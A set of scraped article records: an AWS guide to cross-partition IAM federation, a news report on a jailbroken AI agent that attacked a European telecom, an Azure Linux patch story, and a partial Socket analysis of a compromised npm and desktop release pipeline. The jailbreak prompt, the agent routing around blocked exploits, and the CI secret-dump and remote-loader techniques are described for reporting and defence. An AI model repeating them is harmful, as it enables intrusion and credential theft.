articles.title: Simplify cross-partition access with AWS IAM outbound identity federation
articles.context: IAM integration – You control access with the same IAM roles, trust policies, and permissions policies you already use
articles.full_text:
You can now use tokens from AWS Identity and Access Management (IAM) outbound federation to assume roles in other Amazon Web Services (AWS) partitions.

When your workloads run across AWS partitions such as Commercial, China, GovCloud (US), and European Sovereign Cloud, a workload in one partition might need to access resources or communicate with AWS services in another partition. AWS partitions are hard isolation boundaries with independent instances of AWS Identity and Access Management (IAM), so a credential issued in one partition isn’t valid in another. As a result, direct role assumption with sts:AssumeRole doesn’t work across partition boundaries and resource policies can’t reference principals that exist in another partition.

AWS IAM outbound identity federation already lets your workloads obtain a short-lived, AWS signed JSON Web Token (JWT) and use it to authenticate to external services. Today, we’re extending it with cross-partition support. Your workloads can now use that same mechanism to federate into another AWS partition. A workload in one partition obtains a short-lived JWT using sts:GetWebIdentityToken and exchanges it for temporary credentials in another partition using sts:AssumeRoleWithWebIdentity with no long-term credentials to store or rotate.

This post walks through configuring cross-partition identity federation using Amazon Simple Storage Service (Amazon S3) data access as an example, but the same steps apply to any cross-partition API call.

Important: If your workload requires cross-partition access, consult your compliance team to make sure that your implementation aligns with your regulatory or compliance obligations. A non-exhaustive list of examples are FedRAMP, ITAR, DoD CC SRG, GDPR, and others.

Why use IAM outbound identity federation for cross-partition access?

IAM outbound identity federation provides several benefits, including:

Carry origin identity into authorization decisions – The destination trust policy can condition on the source identity’s context, its AWS account, organization ID (org_id), source AWS Region, and principal, so you authorize based on who and where the request originated, not only that a token is valid.

Cross-partition audit trail – AWS CloudTrail events in the destination Region include the source principal Amazon Resource Name (ARN), source Region, and a token ID that correlates back to the source Region’s GetWebIdentityToken CloudTrail event.

Temporary credentials end to end – Your workload authenticates with a short-lived, signed JWT and receives temporary credentials, so every stage of cross-partition access uses credentials that expire automatically.

Fully managed token infrastructure – AWS Security Token Service (AWS STS) issues, signs, and publishes verification keys for the JWTs. You don’t need to implement a public key infrastructure (PKI) or host your own OpenID Provider.

IAM integration – You control access with the same IAM roles, trust policies, and permissions policies you already use. Destination accounts can condition on subject, audience, source Region, account, organization ID, and principal ID.

Session revocation – You can revoke credentials that have already been issued. Scope the revocation by origin or apply a deny on the destination role.

How cross-partition identity federation with IAM outbound identity federation works

Cross-partition identity federation works by obtaining a signed JWT from AWS STS in the source partition and exchanging that JWT for temporary credentials from AWS STS in the destination partition.

For example, a workload running in the AWS Govcloud (US) partition in the us-gov-west-1 Region can obtain a JWT and exchange it for temporary credentials valid in the AWS Commercial partition in the us-east-1 Region.

Architecture overview

The following diagram shows the elements and workflow used to support cross-partition access.

Figure 1: Cross-partition flow diagram

The cross-partition flow works as follows:

Token request – Your workload, running in a Region from the source partition calls sts:GetWebIdentityToken API.

Token issuance – AWS STS returns a short-lived, cryptographically signed JWT. The token contains claims that assert your workload’s AWS identity, including the account ID, the principal ARN, source Region, and more.

Token presentation – Your workload calls sts:AssumeRoleWithWebIdentity on the AWS STS endpoint in a Region in the destination partition, passing the JWT as the web identity token and the ARN of the target role in the destination partition.

Fetch verification keys and metadata – AWS STS in the destination partition retrieves the public verification key from your OpenID Connect (OIDC) Issuer URL’s JWKS endpoint.

Validation: AWS STS in the destination partition verifies the token’s signature and evaluates the target role’s trust policy.

Return temporary credentials: AWS STS in the destination partition returns temporary credentials scoped by the policies attached to the role.

Cross-partition resource access – Your workload uses the temporary credentials to access resources in the destination partition, such as an S3 bucket.

Setting up cross-partition identity federation

In this walkthrough, we use the example of a workload running in the us-gov-west-1 Region that needs to access data in an S3 bucket in the us-east-1 Region.

Prerequisites

For this walkthrough, you need the following:

Two AWS accounts: one in the source partition, AWS GovCloud (US), where the workload runs and one in the destination partition, AWS Commercial, that holds the data.

In the source account: an IAM principal with permissions to enable outbound web identity federation (iam:EnableOutboundWebIdentityFederation) and to call sts:GetWebIdentityToken to obtain a signed JWT representing its identity.

In the destination account: an IAM principal with permissions to register the source account’s issuer as an OIDC identity provider (iam:CreateOpenIDConnectProvider) and create an IAM role whose trust policy allows sts:AssumeRoleWithWebIdentity from that provider, conditioned on the token’s aud and sub claims.

An S3 bucket in the destination account that holds the data you want to access from the source partition.

A local installation of AWS Command Line Interface (AWS CLI)

So you can run and verify every step from your own command line, this walkthrough has you assume the workload role as the token-creating identity. In production, an Amazon Elastic Compute Cloud (Amazon EC2) instance, AWS Lambda function, or Amazon Elastic Kubernetes Service (AWS EKS) Pod runs as that role automatically through its instance profile or execution role with no assume-role step.

Step 0: Configure credentials for the GovCloud and Commercial AWS CLI profiles

This walkthrough runs commands in two partitions, so configure a named AWS CLI profile for each. For example, GovCloudCredentials for the source account and CommercialCredentials for the destination. Use the --profile parameter matching the partition where you run each command. In this walkthrough we configure our profiles in the ~/.aws/config file:

[profile GovCloudCredentials] region = us-gov-west-1 # GovCloud account credentials / SSO [profile CommercialCredentials] region = us-east-1 # Commercial account credentials / SSO

Step 1: Enable outbound identity federation on the source account

Enable outbound identity federation on your GovCloud account to generate a unique issuer URL that hosts the OIDC discovery endpoint needed for cross-partition trust. This needs to be performed once in the source account.

Using the AWS CLI:

Ensure your IAM principal has permission to call iam:EnableOutboundWebIdentityFederation.

Run the following command.

aws iam enable-outbound-web-identity-federation --region us-gov-west-1 --profile GovCloudCredentials

Copy the issuer URL from the command output. For GovCloud, it looks like: https://<unique-id>.tokens.sts.us-gov.api.aws

Note: IAM has a single endpoint per partition. The --region parameter simply targets that partition’s IAM. Enabling outbound web identity federation is an account-wide setting, so you only need to run this once.

Step 2: Allow your IAM principal to generate JWTs in the source partition

Create an IAM policy that grants permission to call the sts:GetWebIdentityToken API and attach it to the IAM principal that will generate tokens. This example uses an IAM role.

Using the AWS CLI:

Ensure your IAM principal has permission to call iam:CreateRole and iam:PutRolePolicy.

Save the following trust policy to a file named workload-trust-policy.json. This policy controls who can assume the workload role; the role’s ARN is what becomes the token’s sub. So that you can run the walkthrough from the AWS CLI, we set the principal to the identity behind your AWS CLI profile. In production, set it to the compute service that runs your workload, for example "Principal": { "Service": "ec2.amazonaws.com" }, which removes the need to assume the role manually.

{ "Version": "2012-10-17", "Statement": [ { "Sid": "AllowCliRoleToAssume", "Effect": "Allow", "Principal": { "AWS": "arn:aws-us-gov:iam::<source-account-id>:role/<your-cli-role>" }, "Action": "sts:AssumeRole" } ] }

Run the following command to create the workload role with the preceding trust policy:

aws iam create-role \ --role-name <your-source-partition-iam-role-name> \ --assume-role-policy-document file://workload-trust-policy.json \ --region us-gov-west-1 \ --profile GovCloudCredentials

Save the following policy to a file named get-web-identity-token-policy.json. This policy grants permission to call sts:GetWebIdentityToken, with conditions that restrict the token audience and limit the token lifetime to 300 seconds:

{ "Version": "2012-10-17", "Statement": [ { "Sid": "AllowTokensForDestination", "Effect": "Allow", "Action": "sts:GetWebIdentityToken", "Resource": "*", "Condition": { "ForAllValues:StringEquals": { "sts:IdentityTokenAudience": "<your-audience-name>" }, "Null": { "sts:IdentityTokenAudience": "false" }, "NumericLessThanEquals": { "sts:DurationSeconds": 300 }, "StringEquals": { "sts:SigningAlgorithm": "ES384" } } } ] }

Run the following command to attach the permissions policy to the role:

aws iam put-role-policy \ --role-name <your-source-partition-iam-role-name> \ --policy-name AllowGetWebIdentityToken \ --policy-document file://get-web-identity-token-policy.json \ --region us-gov-west-1 \ --profile GovCloudCredentials

For the full detailed walkthrough of these steps, see Getting started with outbound identity federation.

Step 3: Configure trust in the destination account

Create an OIDC identity provider and a trust policy in your Commercial account using the issuer URL from Step 1.

Using the AWS CLI:

Ensure your IAM principal has permission to call iam:CreateOpenIDConnectProvider and iam:CreateRole.

Run the following command to register the source account’s issuer URL as an OIDC identity provider in the destination account:

aws iam create-open-id-connect-provider \ --url https://<unique-id>.tokens.sts.us-gov.api.aws \ --client-id-list "<your-audience-name>" \ --region us-east-1 \ --profile CommercialCredentials

Note: --thumbprint-list is optional; IAM retrieves the issuer’s certificate thumbprint automatically. Because the AWS STS issuer endpoint uses a certificate from a trusted certificate authority (CA), AWS validates it against its trusted root CAs.

Save the following trust policy to a file named trust-policy.json. This policy allows the role to be assumed only with tokens matching the expected audience and originating from us-gov-west-1:

{ "Version": "2012-10-17", "Statement": [ { "Sid": "AllowTrustedGovCloudSourceRole", "Effect": "Allow", "Principal": { "Federated": "arn:aws:iam::<destination-account-id>:oidc-provider/<unique-id>.tokens.sts.us-gov.api.aws" }, "Action": "sts:AssumeRoleWithWebIdentity", "Condition": { "StringEquals": { "<unique-id>.tokens.sts.us-gov.api.aws:sub": "arn:aws-us-gov:iam::<source-account-id>:role/<your-source-partition-iam-role-name>", "<unique-id>.tokens.sts.us-gov.api.aws:aud": "<your-audience-name>", "<unique-id>.tokens.sts.us-gov.api.aws:source_region": "us-gov-west-1", "<unique-id>.tokens.sts.us-gov.api.aws:org_id": "<your-source-org-id>" } } } ] }

Run the following command to create the role with the preceding trust policy:

aws iam create-role \ --role-name <your-destination-partition-iam-role-name> \ --assume-role-policy-document file://trust-policy.json \ --region us-east-1 \ --profile CommercialCredentials

Run the following command to attach a permissions policy granting access to the destination S3 bucket:

aws iam attach-role-policy \ --role-name <your-destination-partition-iam-role-name> \ --policy-arn arn:aws:iam::<destination-account-id>:policy/<your-s3-access-policy> \ --region us-east-1 \ --profile CommercialCredentials

Step 4: Cross-partition resource access

With the setup complete, your workload requests a JWT from the source partition, exchanges it for temporary credentials in the destination partition, and uses those credentials to access the S3 bucket.

Using the AWS CLI:

Assume the workload role. In production your workload already runs as this role through its instance profile or execution role, so it skips this step. To trace the flow from the AWS CLI, assume the workload role so the token you create carries that role as its sub. This command uses jq to parse the JSON:

WORKLOAD_CREDS=$(aws sts assume-role \ --role-arn arn:aws-us-gov:iam::<source-account-id>:role/<your-source-partition-iam-role-name> \ --role-session-name trace-cross-partition \ --region us-gov-west-1 --profile GovCloudCredentials) export AWS_ACCESS_KEY_ID=$(echo "$WORKLOAD_CREDS" | jq -r '.Credentials.AccessKeyId') export AWS_SECRET_ACCESS_KEY=$(echo "$WORKLOAD_CREDS" | jq -r '.Credentials.SecretAccessKey') export AWS_SESSION_TOKEN=$(echo "$WORKLOAD_CREDS" | jq -r '.Credentials.SessionToken')

Create the signed JWT from AWS STS and capture it as a variable:

WEB_IDENTITY_TOKEN=$(aws sts get-web-identity-token \ --audience "<your-audience-name>" \ --signing-algorithm ES384 \ --duration-seconds 300 \ --region us-gov-west-1 \ --query WebIdentityToken --output text)

Run the following command to exchange the JWT for temporary credentials in the destination partition:

CREDENTIALS=$(aws sts assume-role-with-web-identity \ --role-arn arn:aws:iam::<destination-account-id>:role/<your-destination-partition-iam-role-name> \ --role-session-name <your-session-name> \ --web-identity-token "$WEB_IDENTITY_TOKEN" \ --region us-east-1)

Export the temporary credentials from the output:

export AWS_ACCESS_KEY_ID=$(echo "$CREDENTIALS" | jq -r '.Credentials.AccessKeyId') export AWS_SECRET_ACCESS_KEY=$(echo "$CREDENTIALS" | jq -r '.Credentials.SecretAccessKey') export AWS_SESSION_TOKEN=$(echo "$CREDENTIALS" | jq -r '.Credentials.SessionToken')

Run the following command to transfer data from the destination S3 bucket:

aws s3 cp s3://<destination(us-east-1)-bucket>/data.csv ./data.csv --region us-east-1

For applications, the following AWS SDK for Python example creates a session that handles the token exchange and refreshes the credentials automatically:

import boto3 import botocore.session from botocore import UNSIGNED from botocore.config import Config from botocore.credentials import DeferredRefreshableCredentials def cross_partition_session(role_arn, audience, source_region, dest_region, session_name="cross-partition-session", duration_seconds=300, signing_algorithm="ES384", source_session=None): ''' This helper method creates a self-refreshing boto3 session object using IAM outbound federation. ''' source_session = source_session or boto3.Session() source_sts = source_session.client("sts", region_name=source_region) dest_sts = boto3.client("sts", region_name=dest_region, config=Config(signature_version=UNSIGNED)) def refresh(): token = source_sts.get_web_identity_token( Audience=[audience], SigningAlgorithm=signing_algorithm, DurationSeconds=duration_seconds, )["WebIdentityToken"] creds = dest_sts.assume_role_with_web_identity( RoleArn=role_arn, RoleSessionName=session_name, WebIdentityToken=token, )["Credentials"] return { "access_key": creds["AccessKeyId"], "secret_key": creds["SecretAccessKey"], "token": creds["SessionToken"], "expiry_time": creds["Expiration"].isoformat(), } botocore_sess = botocore.session.get_session() botocore_sess._credentials = DeferredRefreshableCredentials( refresh_using=refresh, method="cross-partition-identity-federation") return boto3.Session(botocore_session=botocore_sess, region_name=dest_region) # Build a cross-partition session, then use it like any other boto3 session. # Credentials refresh automatically as they near expiry, no manual re-minting. session = cross_partition_session( role_arn="arn:aws:iam::<destination-account-id>:role/<destination-role>", audience="<your-audience>", source_region="us-gov-west-1", dest_region="us-east-1", ) # Confirm which identity we're operating as in the destination partition. print(session.client("sts").get_caller_identity()["Arn"]) # Use the session for real work, e.g. read an object from the destination bucket. session.client("s3").download_file("<destination-bucket>", "data.csv", "data.csv")

Security best practices

We recommend the following best practices for cross-partition access using IAM outbound identity federation.

Principle of least privilege – Grant only the minimum permissions needed in the destination partition role. Scope to specific resources and actions.

Use condition keys – In the source account, restrict token audience and duration through IAM policy conditions. In the destination trust policy, use the aud and sub conditions to control which tokens can assume which roles.

Short token lifetimes – Use the shortest practical duration.

Monitor with CloudTrail – Enable CloudTrail in both accounts. The source GetWebIdentityToken event records responseElements.webIdentityTokenId, and the destination AssumeRoleWithWebIdentity event records the same value as requestParameters.webIdentityTokenId alongside the source principal ARN and source Region. Matching those two fields correlates access end-to-end across partitions.

Verify compliance – Consult your compliance team to ensure cross-partition data movement meets regulatory requirements.

Access Path – Access should be initiated from the more restrictive partition to the less restrictive partition.

Controlling cross-partition access by origin

Cross-partition federation is not enabled by default. You enable it at an AWS account level and configure a federation provider. Once enabled, you can control the providers that are allowed to federate in. The condition key aws:FederatedProvider can be used to restrict which federation provider or partitions are allowed, or to deny API calls from credentials federated from a source account or provider. A new condition key introduced with this release, aws:CrossPartitionSourceRegion can be used to deny API calls federated from a source Region.

Allowlist approved origins

To constrain which origins can federate in, apply an RCP on sts:AssumeRoleWithWebIdentity. Because RCPs are deny-only, you express an allowlist as a deny on anything outside your approved set, enforced before any credentials are issued.

Note that sts:AssumeRoleWithWebIdentity is used by all OIDC federation such as GitHub Actions, Amazon EKS, and others, not just cross-partition. Each policy pairs the allowlist with a StringLike that matches any IAM outbound identity federation issuer (*.tokens.sts.*), so the deny applies only to cross-partition federation and leaves your other OIDC providers untouched. The following two examples demonstrate allowing specific issuers or partitions:

Allowlist trusted issuers. Use aws:FederatedProvider with StringNotLike on the OIDC provider ARN to deny federation from any issuer outside your approved set.

{ "Version": "2012-10-17", "Statement": [ { "Sid": "AllowlistApprovedIssuer", "Effect": "Deny", "Principal": "*", "Action": "sts:AssumeRoleWithWebIdentity", "Resource": "*", "Condition": { "StringLike": { "aws:FederatedProvider": "arn:*:iam::*:oidc-provider/*.tokens.sts.*" }, "StringNotLike": { "aws:FederatedProvider": [ "arn:*:iam::*:oidc-provider/<issuer-host>" ] } } } ] }

Allowlist a partition. Use aws:FederatedProvider with StringNotLike on the issuer domain to deny federation from any partition you have not approved, without enumerating individual issuer ARNs. Include any cross-partition issuer you want to allow in the policy.

{ "Version": "2012-10-17", "Statement": [ { "Sid": "AllowlistApprovedPartition", "Effect": "Deny", "Principal": "*", "Action": "sts:AssumeRoleWithWebIdentity", "Resource": "*", "Condition": { "StringLike": { "aws:FederatedProvider": "arn:*:iam::*:oidc-provider/*.tokens.sts.*" }, "StringNotLike": { "aws:FederatedProvider": [ "arn:*:iam::*:oidc-provider/*.tokens.sts.us-gov.api.aws" ] } } } ] }

Use policy to control or revoke access after role assumption

Because AWS authorizes requests against the policies in effect, a deny on either key stops in-flight sessions on their next API call. The following examples use an SCP and give you three levers, from one issuer up to an entire partition:

Deny one issuer. Use aws:FederatedProvider with StringEquals on the OIDC provider ARN to deny every API call made with credentials federated from a single source account.

{ "Version": "2012-10-17", "Statement": [ { "Sid": "DenySessionsFromSourceIssuer", "Effect": "Deny", "Action": "*", "Resource": "*", "Condition": { "StringLike": { "aws:FederatedProvider": "arn:aws:iam::<destination-account-id>:oidc-provider/<unique-id>.tokens.sts.us-gov.api.aws" } } } ] }

Deny one Region. Use the new aws:CrossPartitionSourceRegion condition key to deny every API call made with credentials whose originating JWT was created in a specific source Region.

{ "Version": "2012-10-17", "Statement": [ { "Sid": "DenySourceRegion", "Effect": "Deny", "Action": "*", "Resource": "*", "Condition": { "StringEquals": { "aws:CrossPartitionSourceRegion": "us-gov-west-1" } } } ] }

Deny whole partition. Use aws:FederatedProvider with StringLike on the issuer domain to deny every API call made with credentials federated from an entire source partition, without enumerating OIDC ARNs or Regions.

{ "Version": "2012-10-17", "Statement": [ { "Sid": "DenySourcePartition", "Effect": "Deny", "Action": "*", "Resource": "*", "Condition": { "StringLike": { "aws:FederatedProvider": "arn:aws:iam::*:oidc-provider/*.tokens.sts.us-gov.api.aws" } } } ] }

You can also attach a policy directly to the role in the destination partition to revoke access. For more information, see Deny access to all IAM role sessions associated with a role.

Auditing cross-partition access with CloudTrail

The source partition logs a GetWebIdentityToken event when the JWT is issued, and the destination partition logs an AssumeRoleWithWebIdentity event when the token is exchanged for temporary credentials, both carrying the same JWT ID (webIdentityTokenId). Matching that ID lets you trace and audit a single token from issuance in one partition to its exchange for AWS STS credentials in the other. In the following sample pair of CloudTrail log entries, the cross-partition calls were made from an EC2 instance using its instance role.

Source partition:

{ "eventName": "GetWebIdentityToken", "eventSource": "sts.amazonaws.com", "eventTime": "2026-09-10T18:33:01Z", "awsRegion": "us-gov-west-1", "userIdentity": { "type": "AssumedRole", "arn": "arn:aws-us-gov:sts::<source-account-id>:assumed-role/<your-source-partition-iam-role-name>/<instance-id>" }, "requestParameters": { "audience": ["<your-audience-name>"], "durationSeconds": 300, "signingAlgorithm": "ES384" }, "responseElements": { "webIdentityTokenId": "6318f9f3-bccf-4d00-8e77-920e810f395c", "expiration": "2026-09-10T18:38:01Z" } }

webIdentityTokenId: The unique identifier on the source partition that correlates this event to the destination AssumeRoleWithWebIdentity CloudTrail event.

Destination partition:

{ "eventName": "AssumeRoleWithWebIdentity", "eventSource": "sts.amazonaws.com", "eventTime": "2026-09-10T18:33:01Z", "awsRegion": "us-east-1", "requestParameters": { "roleArn": "arn:aws:iam::<destination-account-id>:role/<your-destination-partition-iam-role-name>", "roleSessionName": "<your-session-name>", "webIdentityTokenId": "6318f9f3-bccf-4d00-8e77-920e810f395c", }, "responseElements": { "subjectFromWebIdentityToken": "arn:aws-us-gov:iam::<source-account-id>:role/<your-source-partition-iam-role-name>", "audience": "<your-audience-name>", "assumedRoleUser": { "arn": "arn:aws:sts::<destination-account-id>:assumed-role/<your-destination-partition-iam-role-name>/<your-session-name>" } }, "additionalEventData": { "crossPartitionData": { "sourcePrincipalArn": "arn:aws-us-gov:iam::<source-account-id>:role/<your-source-partition-iam-role-name>", "sourceRegion": "us-gov-west-1" } } }

sourcePrincipalArn: The IAM principal that obtained the JWT in the source Region.

sourceRegion: The Region where the JWT was issued.

webIdentityTokenData: The unique identifier on the destination partition that correlates this event to the source GetWebIdentityToken CloudTrail event.

Availability and pricing

Cross-partition IAM outbound identity federation is available in all Regions within the AWS Commercial (aws), China (aws-cn), GovCloud (US) (aws-us-gov), and European Sovereign Cloud (aws-eusc) partitions, at no additional cost. Note that same-partition identity federation isn’t supported with IAM outbound identity federation; for cross-account access within a single partition, use sts:AssumeRole.

Alternative option for cross-partition access

Organizations that already operate a public key infrastructure (PKI) can also use IAM Roles Anywhere to give workloads access across partitions. IAM Roles Anywhere can use your existing certificate authority (CA) or AWS Private Certificate Authority to issue and manage x.509 certificates to specific workloads and applications. To learn more about this alternative, see the blog post Transfer data across AWS partitions with IAM Roles Anywhere.

Conclusion

Cross-partition identity federation gives your workloads a way to reach across AWS partition boundaries without storing or rotating long-term credentials. Short-lived JWTs handle authentication at every stage, and standard IAM roles handle authorization, so the security model is consistent with what you already use inside a single partition. Cross-partition identity federation operates exclusively across AWS partition boundaries. Same-partition federation isn’t supported using IAM outbound identity federation. To learn more, see Federating AWS identities across AWS partitions in the IAM User Guide.

Partitions are isolation boundaries by design with independent IAM instances and separate credentialed access between Regions in different partitions. Treat cross-partition access as an exception and before you establish any, confirm it’s permitted under your regulatory, compliance, and security requirements. For more detail on partitions as a fault isolation boundary, see AWS Fault Isolation Boundaries and Meeting data residency requirements on AWS.

Bill Wells

Bill is a Senior Solutions Architect at AWS with over 20 years of IT experience that began in the U.S. Air Force. Drawing on a diverse background across multiple organizations, Bill specializes in architecting secure, compliance-aligned cloud solutions that help federal partners achieve mission outcomes with AWS.

Nithin Jayakar Padala

Nithin is a Software Development Engineer on the AWS IAM team. He works on the core identity systems behind the temporary credentials that customers rely on for short-term access to AWS services at massive scale. He enjoys working on hard problems at the intersection of distributed systems, identity, and security. Outside of work, Nithin can be found traveling, value investing, watching anime, or volunteering with local charities.

articles.title: Jailbroken AI Agent Ran Two-Week Attack on European Telecom
articles.context: Read more on AI-driven attacks: Chinese Hacker Uses DeepSeek AI to Orchestrate Vulnerability Exploits Autonomous Agent Adapted When Its Attacks Were Blocked The operator's...
articles.full_text:
A jailbroken AI agent has spent more than two weeks attacking a European telecommunications provider and 13 organizations hosted on its data center and cloud infrastructure.

Malbear Labs, which has dubbed the campaign Operation Snowball, detailed the activity in research published November 8 after finding the attacker's working directory during a routine sweep for exposed open directories. The unprotected directory held more than 70 session transcripts and the agent's own reports.

The custom agent framework ran on DeepSeek Flash, with a jailbreak prompt of about 78,000 characters that told the model to treat any refusal as a malfunction. Malbear wrote that the transcripts contained no recorded refusals.

Read more on AI-driven attacks: Chinese Hacker Uses DeepSeek AI to Orchestrate Vulnerability Exploits

Autonomous Agent Adapted When Its Attacks Were Blocked

The operator's messages, translated from Chinese, were brief. Besides prompts such as "Go on" and "Stop," they set a target subnet, put three internal hosts off-limits and followed up on the agent's vulnerability list. Malbear wrote that the operator "delegated the intrusion to an AI and checked in asynchronously to review progress."

The agent entered the telecom by exploiting CVE-2026-20320, an unauthenticated XML external entity (XXE) flaw in Cisco BroadWorks. Cisco fixed the flaw in August.

The agent went on to exploit Liferay (CVE-2020-7961) for root access on a host spanning several internal networks and JBoss/RichFaces (CVE-2013-2165) for a second foothold. Malbear listed more than a dozen other flaws the agent targeted, found or kept in its toolkit, none marked as exploited.

When endpoint security blocked an attempt to exploit the Linux flaw PwnKit (CVE-2021-4034), the agent changed its approach without operator direction. After a tunneling tool was blocked, it wrote a replacement.

Access Claims Extended to Patient and Monitoring Data

According to Malbear, the recovered transcripts showed the agent extracting dozens of credential sets, private keys and a healthcare organization's Active Directory data.

The agent also reported reaching subscriber billing records and what Malbear described as millions of patient records, through a TrakCare Oracle database that still used default credentials.

Its reports also listed about 80 Zabbix monitoring backups covering the provider's managed-services customers.

The post does not say whether Malbear checked these claims with any victim, what was taken rather than staged or whether all 13 organizations were breached.

Malbear assessed the activity as consistent with a Chinese-origin operator and did not link it to a state actor. Its recommendations included treating internet-exposed, end-of-life JBoss Application Server 6 instances as compromised and watching internal traffic for tunneling.

articles.title: NIST: Solo Shouldn't Mean Less Secure
Microsoft's Azure Linux gets 470-plus security fixes in one almighty patching session
articles.context: The hefty release comes amid an AI-fueled surge in vulnerability discovery that has left developers struggling to keep up with the resulting patch workload
articles.full_text: Microsoft has unleashed a whopper of an update for Azure Linux, packing more than 470 CVE fixes into a single release as the software industry's ever-growing pile of vulnerabilities shows little sign of shrinking. Over the weekend, Microsoft rolled out Azure Linux 3.0.2022 with fixes covering everything from the Linux kernel to open source packages and container software. The changelog runs to hundreds of entries, so anyone planning to read the whole thing might want to put the kettle on. Microsoft's release notes contain more than 470 CVE references, although some vulnerabilities appear multiple times because they affect different packages. So that's not necessarily 470 separate security holes, but it's still an impressive amount of patching for one release. The fixes span OpenSSL, curl, Kubernetes, Docker, QEMU, and a lengthy list of other packages that underpin modern Linux environments. The generic Linux kernel has been updated to version 6.6.161.1. There's also been some housekeeping following the eMudhra certificate incident, tracked as CVE-2026-114406. Microsoft has removed or distrusted root certificates that could validate compromised eMudhra intermediate certificates, while adding checks in Python and Go to reject the affected certificates. It has also preserved SSL.com TLS trust where required, presumably to avoid fixing one certificate headache by creating another. Container infrastructure gets plenty of attention, too, with fixes spanning KubeVirt, containerd, Docker Compose, and other components used to keep cloud workloads running. Several CVEs crop up repeatedly across these packages, helping explain the eye-watering number of entries in the changelog. The release includes less security-focused changes too, including new Dockerfiles, an OpenVMM patch for confidential computing support, fixes for systemd hangs, and adjustments to GRUB Secure Boot metadata. The hefty release comes amid an AI-fueled surge in vulnerability discovery that has left developers struggling to keep up with the resulting patch workload. As The Register reported earlier today, Linux creator Linus Torvalds reckons there may finally be signs that the flood is easing, at least in some corners of the kernel. Torvalds said fixes are now arriving faster than new bug reports in the kernel's eBPF subsystem, although he noted that most other areas haven't reached that point. Whether the wider software industry is anywhere close to catching up is another matter, and Microsoft hasn't said if AI-assisted research contributed to the vulnerabilities addressed in this release. Azure Linux, formerly known as CBL-Mariner, is Microsoft's own Linux distribution, developed primarily for its cloud infrastructure and services. That makes keeping its many components patched rather more important than the modest version-number bump might suggest. And judging by the size of this latest changelog, Microsoft's patching teams aren't likely to be putting their feet up anytime soon. ®

articles.title: Malicious bee-js npm Release and Swarm Desktop Releases Deliver SleepyDuck Ethereum C2 Backdoor
articles.context: Gatekeeper therefore shows only the normal first-launch prompt
articles.full_text:
Socket’s Threat Research Team analyzed the November 9, 2026 compromise of Ethersphere’s release pipeline, in which a threat actor used the project’s own GitHub automation to publish a malicious @ethersphere/bee-js 13.3.0 to npm and a trojanized Swarm Desktop 0.56.2 release on GitHub. Both artifacts carry a small loader that fetches JavaScript from api[.]frameworkmetrics[.]xyz and executes it with full Node.js privileges. The Ethereum smart contract that tells the later stages where to connect, the wallet that controls it, and the stage-3 implant files are the same ones Pluto Security documented on October 1, 2026 in its analysis of the SleepyDuck / EtherDuck Open VSX campaign. npm removed 13.3.0 about 75 minutes after it was published; the Swarm Desktop release stayed up for about eight and a half hours.

@ethersphere/bee-js 13.3.0 (npm): scripts/generate-version.cjs was rewritten into a remote-code loader and promoted to a postinstall hook. The package was published by Ethersphere’s legitimate trusted-publishing workflow with valid SLSA provenance, and the loader ran three times inside that publishing job.

Swarm Desktop 0.56.2 (GitHub release): all nine Linux, macOS and Windows packages come from the same CI run, and every one we unpacked contains the same loader in the Electron main process. The macOS build is signed with the project’s Developer ID and notarized by Apple, and the release became available to Apple Silicon and Windows x64 users through the app’s auto-updater.

Shared infrastructure with SleepyDuck / EtherDuck: the loaders’ later stages read their command-and-control (C2) address from Ethereum contract 0xf8a900Db50b3331be6B768bA460BB59f3E40C344, which has been maintained by the same wallet since March 2026 and was previously used by malicious Solidity extensions on Open VSX.

SafeDep published a detailed public analysis of this incident. This post focuses on how the threat actor got in, how the release pipeline was used, what the loaders do, and the link to the earlier Open VSX campaign.

Background #

@ethersphere/bee-js is the JavaScript client library for Bee, the node software of the Swarm decentralized storage network. It averaged about 470 npm downloads a day in early November 2026 and is used by Ethersphere’s own tools (swarm-cli, bee-dashboard, create-swarm-app) and by third-party Swarm applications. Swarm Desktop is Ethersphere’s Electron application that installs and runs a Bee node, including the node’s Ethereum wallet, on macOS, Windows and Linux.

Both projects release through GitHub Actions. bee-js has published to npm with trusted publishing (OIDC, no long-lived npm token) since January 2026, and Swarm Desktop builds, signs and notarizes its installers in CI.

How the Threat Actor Got In #

The November 9 releases were not the start. Two days earlier the same actor tried and failed to harvest credentials from Ethersphere’s CI, then abandoned the attempt. The November 9 compromise used access already held.

Socket’s analysis indicates two GitHub accounts were compromised: nugaon, a maintainer who authored swarm-cli’s initial commit in 2021 and still held force-push rights to an unprotected master in 2026, and bee-worker, the release automation identity. Both appear as push actors in GitHub’s activity logs, which are derived server-side from the authenticating credential. Because the November 6 harvest failed, neither credential came from it — the origin of both compromises predates November 6 and remains unexplained.

November 6: Failed Secret Harvesting

All times UTC.

17:06:33 — swarm-desktop, branch probe/force-dryrun-1793984793: write-access probe at an existing commit, carrying no payload.

17:12:25 — swarm-desktop, branch security/lab-secrets-1793985145: workflow_dispatch secret dump.

17:14:35 — swarm-desktop, branch test-run: the same payload, renamed.

18:01:14 — swarm-cli, master: workflow_dispatch secret dump, reverted at 18:05:46.

18:42–19:55 — swarm-cli, master: exfiltration injected into the existing check.yaml (on: push), revised ten times.

The numeric suffixes are Unix epochs matching each branch’s creation time, indicating the names were generated programmatically.

All three workflows are the same tool: each dumps the full secrets and vars contexts via ${{ toJSON(secrets) }} and POSTs them to the same webhook[.]site collector, which is what makes this one campaign rather than two incidents. After the standalone workflows failed, the actor injected the payload into swarm-cli’s existing check.yaml as a step named sudo apt update, then revised it eleven times in 72 minutes across three collectors and a pastebin[.]com second stage. The targets narrowed from the whole secrets context to GitHub PATs, then to Apple and Windows code-signing material, and finally to NPM_TOKEN. Most of the individually named secrets appear nowhere in swarm-cli’s workflows, including code-signing material that belongs to a desktop application rather than a command-line tool. An undefined secret resolves to an empty string in GitHub Actions, so the enumeration reflects guesswork rather than knowledge of what the repository actually held. At 19:55:47 UTC the actor restored master and never returned.

No Evidence of Exfiltration

All three collectors remain readable. Across 38 captured requests, no request carries a body — content, query and files are empty and size is 0 on every entry — and no Microsoft Azure address appears, the range GitHub-hosted runners egress from. The collector that received the NPM_TOKEN payload logged nothing at all.

Three of the four attempts could not have run: workflow_dispatch workflows are only triggerable from a repository’s default branch, and the swarm-desktop pair sat on feature branches. The check.yaml injections should have executed, and Socket could not determine why they produced no data; Actions is currently disabled on swarm-cli, so its run history is unavailable for review.

Socket assesses with moderate confidence that nothing was exfiltrated. Two of the three collectors retain their full November 6 history, including the actor’s own browser visits, making selective deletion unlikely; the empty third remains ambiguous.

Authorship Is Not Attribution

